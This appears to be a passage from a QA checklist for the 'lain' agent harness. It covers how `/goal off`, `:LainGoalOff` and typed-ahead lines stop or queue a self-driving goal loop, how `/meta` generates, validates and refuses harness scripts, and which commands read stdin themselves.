`/goal off` typed after iteration 2 ran only after iterations 3–5 and the cap, then printed `goal
off`. The third terminating condition was unreachable from the TTY.

**Fixed since the discharging chunk's last cards: `/goal off` typed mid-drive stops the goal before
its next iteration, and (round 20's A-1) the same in a cockpit.** Between iterations the chat asks the
terminal for what was typed, holds each whole line, and dispatches held lines before the driver's next
prompt; a line typed while an iteration waits on a drawn `[y/N]` is held too, and never read as a
decision (`method.md`). The reply changed with it: `goal off -- the driver stopped before its next
iteration; type your next line at you>`, and with nothing driving, `goal off -- no standing goal was
driving` (both driven 2026-09-14). *Driven 2026-09-14* in a `--no-nvim` chat inside tmux, with an
objective the model cannot finish (`/goal list every prime number, one per reply, and never say you are
finished`): `/mode` and `/goal off` typed during iteration 2 rendered

    held as your next prompt: /mode
    held as your next prompt: /goal off
    checkout auto: goal (GOAL)
    goal off -- the driver stopped before its next iteration; type your next line at you>

when iteration 2 ended. **Count the iterations as `goal_iteration` records MINUS
`goal_iteration_dropped` records**, not the first alone: an iteration already driven when a late control
line arrives is withdrawn and journaled as `goal_iteration_dropped`, so a raw `goal_iteration` count reads
one high for that goal. That run's journal holds two `goal_iteration` records and no dropped one, not
five. (Iteration 2 itself ended on `error: loop ran 25 iterations, ceiling is 25`, the per-ask
ceiling, which is the model looping inside one ask and not the goal's cap.) A third `goal_iteration`
after the held `/goal off` with no matching drop is F105 back. **A partial line typed mid-drive is not
lost**: it is typed back into the next prompt's editor for the human to finish *(prediction, not yet
driven)*.

**The cockpit: a control line typed in the input pane acts when it arrives, not at the next `you>`.**
Round 20's A-1: in a `lain up` cockpit a typed `/goal off` mid-drive only ran after the goal hit its cap
(the input pane stopped drawing on `unpublished` and the line never left the pane process), while
`:LainGoalOff` stopped it after 1 iteration. Drive both from a cockpit with a cap of 5 and an objective
the model cannot finish, typing `/goal off` **in the input pane** during iteration 1:

- **PASS:** no iteration 2 starts, the chat pane prints the `goal off` reply, and `goal_iteration` minus
  `goal_iteration_dropped` is **1**.
- **Catches A-1 returning:** iterations 2 to 5 run and `goal off` prints only after the cap.
- On this model a `/goal off` typed during iteration 1 is held, because the model parks an `ask_human`; it ran at the boundary, and `goal_iteration` is 1. It passes, but it cannot tell "acts on arrival" from "acts at the boundary" (round 26; a property of this model, no card).
- **This model ends the prime-list goal in iteration 1** (round 25), so the cockpit A-1 check cannot discriminate on
  it: a goal that finishes at once looks like a pass. Use a stand-in model that cannot finish.
- `/stop` typed in the pane mid-ask stops the ask before it would have finished: `run_interrupted` with
  `reason: stopped` is journaled while the model is still generating. An ordinary line typed mid-ask
  (`hello`) is NOT dispatched then: it becomes the next prompt, **once** (not lost, not doubled).
  **Automated by** `spec/e2e/stop_while_busy_spec.rb`, "reaches the chat at once, before a model that never answers is released" and "holds lines typed mid-ask and sends them once each, in order, as the next prompts": both checks in this bullet, in a cockpit, against a stand-in that holds the model open. **Still needs a human:** the PASS and A-1 checks above, which need a goal driving a live model.

**Two accepted limits, recorded so a round does not file them:**

- **On the TTY (`--no-nvim`), `/goal off` acts at the next iteration boundary**, not mid-iteration: the
  chat can only ask the terminal for what was typed between iterations, so the iteration already running
  finishes first. Expect exactly one more iteration's worth of wait, and no further iteration after it.
- **A half-typed line waits for Enter.** A control line whose Enter has not been pressed is not a line
  yet: `/goal off` typed without Enter does nothing until the human presses it, on both surfaces.

**The cockpit can stop it too: `:LainGoalOff` in nvim.** With a goal driving it stops the driver before
its next iteration and the chat pane says `goal off from the editor -- the driver stopped before its
next iteration` *(driven in round 22, and it passes)*. With none driving, the editor says so, *driven
2026-09-14* in a `lain up` cockpit: `lain: :LainGoalOff stops a standing goal, and none is driving`,
with the chat pane untouched at `you>`. `:h lain-runtime-commands` (`plugin/nvim/doc/lain.txt`)
documents it. `/mode -goal` with a goal standing stops it as `/goal off` does.

The cap is the one to record numerically: **note how many turns it ran and what that cost**. Nothing
else in `planning/qa/` records tokens per act, and a self-driving loop is where that gap is most
expensive.

Also confirm the `goal` **layer** appears in `/mode` while a goal is standing, and clears when it
ends — the layer and the driver are two objects and this is the only place they are checked against
each other. Round 17 read `/mode` as `accept_edits: no layers active` (the pre-round-18 form; today it reads `checkout auto: no layers active`) while a goal stood.
Since the discharging chunk's last cards the driver owns the layer: *driven 2026-09-14*, the goal
above journaled `mode_switch` raising `goal` (`to_layers: ["goal"]`, `surface: goal`) as it started,
`/mode` mid-drive answered `accept_edits: goal (GOAL)`, and `/goal off` journaled the lowering
(`from_layers: ["goal"]`, `to_layers: []`). A goal that ends on `GOAL_COMPLETE` lowers
it the same way (driven in round 23: `goal reached: the agent signalled GOAL_COMPLETE`, then a `mode_switch` with `from_layers: ["goal"]`); the cap leg is not yet reached, since the model ends in iteration 1. (A no-op `policy_switch escalation -> escalation` journaled beside a
layer flip is a recorded follow-up — noise for bench readers, not a finding.)

## 8 — `/meta`, and its three verbs behind one word

```
you> /meta                          empty -> usage
you> /meta a loop that greps for TODOs
you> /meta summarizer keep only decisions
you> /meta run <slug>
```

`/meta <prompt>` generates a harness script to review; `/meta summarizer <prompt>` generates a
summarizer declaration; `/meta run <slug>` launches an existing script. **The first word shadows**,
which is documented and is the check: `/meta run a loop for me` is read as a **launch** of a script
called `a`, not as a prompt. Confirm that behaves as documented rather than as a surprise, and
confirm `/meta run <nonexistent>` refuses by name.

**Corrected by round 17: `/meta run a loop for me` is not read as launching `a`** — the rest of the
line is taken as the slug and refused. *Driven 2026-09-14*, all three zero-model:

```
you> /meta run a loop for me   not a valid script name: "a loop for me" -- a slug is lowercase letters, digits, and dashes (the name /meta printed when it wrote the script)
you> /meta run nosuch          no script "nosuch" has been generated (<root>/.lain/meta/nosuch.rb does not exist) -- generate one first with /meta <prompt>
you> /meta run bad             "bad" (<root>/.lain/meta/bad.rb) does not parse as Ruby -- regenerate it with /meta <prompt>, or fix it by hand, before running it
```

**The last one is new, and it is round 17's F125.** `/meta` wrote a model's prose reply to
`.lain/meta/<slug>.rb` as a ready script, and `/meta run` launched it into a window that died. The
script is now checked with a parse that never evaluates it: `/meta run` refuses an unparseable file
by name (driven above, over a hand-planted prose file; **the planted "prose" must actually fail `ruby -c`**, or the refusal has nothing to fire on, so run `ruby -c` on it first), and a `/meta <prompt>` whose reply does not
parse says `wrote <path>, but it does not parse as Ruby -- <role> answered with something other
than code. Review it and try /meta again; /meta run would refuse to launch it as it stands.`
*(Driven in round 23, for both the harness and the summarizer: a reply that was a shell `find ... -exec grep` line wrote the script and said this sentence.)*

**Review the generated script before running it.** The usage line says so and the round should obey
it — `/meta` generates something that then executes, and a QA round that pipes a model's output
straight into a launch is the one act in this whole directory that can damage the sandbox.

## 9 — The one structural property, and how to see it

`Registry#serves_replies?` asks whether a command **reads the terminal itself** — so that no reply
surface may be opened around the line that invokes it. **Two commands answer yes since 2026-09-14:
`/inbox`, which opens its own `human>` drain over the pending questions, and `/approve`, which asks
each pending call's `[y/N]` through the same stdin.** This paragraph used to say exactly one; round
17's typeahead-into-approval race (F102) is why `/approve` joined it. It matters because a reply
loop started *around* such a line would read the same stdin the command is reading, and a `y`
would land on whichever reader won it.

`cockpit-surfaces.md` §5b drives `/inbox`'s own drain, and §5 drives `/approve`. What belongs **here**
is the negative: with a question parked, type a **different** command at the reply prompt —
`human>` in a `--no-nvim` chat, `command>` in a cockpit — `/status`, `/pin`, `/mode` — and confirm
each runs and returns to that read with the question still parked. A command
that swallows the parked question, or that drops the reply loop, is the failure, and it can only be
seen by driving commands that are *not* `/inbox`.
